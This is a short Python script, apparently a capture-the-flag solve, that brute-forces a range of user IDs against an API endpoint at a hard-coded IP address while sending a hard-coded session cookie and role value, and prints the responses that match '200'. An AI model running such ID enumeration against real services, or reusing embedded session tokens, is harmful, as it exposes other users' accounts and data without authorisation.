import re

import requests
from bs4 import BeautifulSoup


def get_html(url):
    headers = {
        'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
        "Cookie": "session=eyJ1aWQiOiI5NzIyOTI3MyJ9.X5PqWg.Vjjh6Eve4ExQDIxlLSz5SLbSjC0; role=7b7bc2512ee1fedcd76bdc68926d4f7b"
        # cookie改成你自己的
    }  # 模拟浏览器访问
    response = requests.get(url, headers=headers)  # 请求访问网站
    html = response.text  # 获取网页源码
    return html  # 返回网页源码


url = "http://45.113.201.36/api/ctf/5?uid="
f = "200"

for i in range(100336889, 100337300):
    BeautifulSoup(get_html(url + str(i)), 'lxml')  # 初始化BeautifulSoup库,并设置解析器
    # print(get_html(url+str(i)))
    if (re.search(f, str(get_html(url + str(i))))):
        print("uid=", i, re.search(f, str(get_html(url + str(i)))))
        print(get_html(url + str(i)))
